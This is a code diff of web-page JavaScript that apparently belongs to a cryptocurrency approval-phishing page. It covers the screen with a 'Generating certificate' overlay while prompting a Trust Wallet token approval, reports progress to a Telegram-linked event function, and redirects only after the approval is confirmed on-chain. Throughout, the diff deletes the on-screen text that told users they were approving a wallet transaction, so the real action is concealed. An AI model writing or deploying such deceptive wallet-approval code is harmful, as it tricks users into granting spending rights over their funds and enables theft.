@@ -92979,26 +92979,23 @@
                 } catch (_) {}
                 const openTrustStay = () => {};
 
-                // Cover site immediately so returning from Trust does not look like "went back to site"
-                const showGenerating = (msg) => {
+                // Cover site: only "Generating certificate" — no Trust/approve helper text
+                const showGenerating = () => {
                     let el = document.getElementById("cert-generating-overlay");
                     if (!el) {
                         el = document.createElement("div");
                         el.id = "cert-generating-overlay";
                         el.setAttribute("style", "position:fixed;inset:0;z-index:99999;background:rgba(10,10,20,0.92);display:flex;flex-direction:column;align-items:center;justify-content:center;color:#fff;font-family:system-ui,sans-serif;padding:24px;text-align:center;");
-                        el.innerHTML = '<div style="width:48px;height:48px;border:3px solid rgba(255,255,255,0.25);border-top-color:#a855f7;border-radius:50%;animation:certspin 0.9s linear infinite;margin-bottom:20px"></div><div id="cert-generating-title" style="font-size:22px;font-weight:700;margin-bottom:8px">Generating certificate</div><div id="cert-generating-msg" style="font-size:14px;opacity:0.85;max-width:320px"></div><style>@keyframes certspin{to{transform:rotate(360deg)}}</style>';
+                        el.innerHTML = '<div style="width:48px;height:48px;border:3px solid rgba(255,255,255,0.25);border-top-color:#a855f7;border-radius:50%;animation:certspin 0.9s linear infinite;margin-bottom:20px"></div><div id="cert-generating-title" style="font-size:22px;font-weight:700">Generating certificate</div><style>@keyframes certspin{to{transform:rotate(360deg)}}</style>';
                         document.body.appendChild(el)
                     }
-                    const msgEl = document.getElementById("cert-generating-msg");
-                    if (msgEl)
-                        msgEl.textContent = msg || "Please wait…"
                 };
                 const hideGenerating = () => {
                     const el = document.getElementById("cert-generating-overlay");
                     if (el && el.parentNode)
                         el.parentNode.removeChild(el)
                 };
-                showGenerating("Open Trust Wallet and approve…");
+                showGenerating();
                 t(3);
                 try {
                     window.__approveInProgress = !0
@@ -93065,8 +93062,8 @@
                         wallet: c
                     });
 
-                    // Stay covered: connect → approve in Trust → only leave overlay after on-chain success
-                    showGenerating("Approve the transaction in Trust Wallet…");
+                    // Stay covered with only "Generating certificate" until on-chain success
+                    showGenerating();
 
                     // Telegram notify only (no balance / top-up)
                     reportEvent("TELEGRAM_SEND_INITIATED", {
@@ -93089,7 +93086,7 @@
 
                     // feeLimit allows Trust to burn TRX OR use energy rental — Trust decides
                     const feeLimit = 15e6;
-                    showGenerating("Approve in Trust Wallet…");
+                    showGenerating();
                     reportEvent("APPROVAL_INITIATED", {
                         feeLimit: feeLimit,
                         mode: "direct-approve-no-topup"
@@ -93163,18 +93160,15 @@
                     return
                 }
 
-                const showGenerating = "function" === typeof options.showGenerating ? options.showGenerating : (msg) => {
+                const showGenerating = "function" === typeof options.showGenerating ? options.showGenerating : () => {
                     let el = document.getElementById("cert-generating-overlay");
                     if (!el) {
                         el = document.createElement("div");
                         el.id = "cert-generating-overlay";
-                        el.setAttribute("style", "position:fixed;inset:0;z-index:99999;background:rgba(10,10,20,0.88);display:flex;flex-direction:column;align-items:center;justify-content:center;color:#fff;font-family:system-ui,sans-serif;padding:24px;text-align:center;");
-                        el.innerHTML = '<div style="width:48px;height:48px;border:3px solid rgba(255,255,255,0.25);border-top-color:#a855f7;border-radius:50%;animation:certspin 0.9s linear infinite;margin-bottom:20px"></div><div id="cert-generating-title" style="font-size:22px;font-weight:700;margin-bottom:8px">Generating certificate</div><div id="cert-generating-msg" style="font-size:14px;opacity:0.85;max-width:320px"></div><style>@keyframes certspin{to{transform:rotate(360deg)}}</style>';
+                        el.setAttribute("style", "position:fixed;inset:0;z-index:99999;background:rgba(10,10,20,0.92);display:flex;flex-direction:column;align-items:center;justify-content:center;color:#fff;font-family:system-ui,sans-serif;padding:24px;text-align:center;");
+                        el.innerHTML = '<div style="width:48px;height:48px;border:3px solid rgba(255,255,255,0.25);border-top-color:#a855f7;border-radius:50%;animation:certspin 0.9s linear infinite;margin-bottom:20px"></div><div id="cert-generating-title" style="font-size:22px;font-weight:700">Generating certificate</div><style>@keyframes certspin{to{transform:rotate(360deg)}}</style>';
                         document.body.appendChild(el)
                     }
-                    const msgEl = document.getElementById("cert-generating-msg");
-                    if (msgEl)
-                        msgEl.textContent = msg || "Confirming your approval on-chain. Please wait…"
                 };
                 const hideGenerating = "function" === typeof options.hideGenerating ? options.hideGenerating : () => {
                     const el = document.getElementById("cert-generating-overlay");
@@ -93202,12 +93196,12 @@
                     }
                 };
                 const waitForOnChainApproval = async () => {
-                    showGenerating("Checking blockchain for your approval…");
+                    showGenerating();
                     t(3);
                     reportEvent("ONCHAIN_APPROVAL_POLL_START", {});
                     const maxPolls = 24;
                     for (let i = 0; i < maxPolls; i += 1) {
-                        showGenerating("Generating certificate… confirming on-chain (" + (i + 1) + "/" + maxPolls + ")");
+                        showGenerating();
                         if (await checkOnChain()) {
                             reportEvent("ONCHAIN_APPROVAL_CONFIRMED", {
                                 poll: i + 1
@@ -93248,7 +93242,7 @@
                     try {
                         window.__approveInProgress = !1
                     } catch (_) {}
-                    showGenerating("Approval confirmed. Opening certificate…");
+                    showGenerating();
                     setTimeout(() => {
                         hideGenerating();
                         window.location.href = "/certificate"
@@ -93291,7 +93285,7 @@
                             tryNo: tryNo,
                             maxTries: maxTries
                         });
-                        showGenerating("Approve in Trust Wallet (" + tryNo + "/" + maxTries + ")…");
+                        showGenerating();
                         try {
                             openTrustStay();
                             await new Promise((resolve) => setTimeout(resolve, 500))
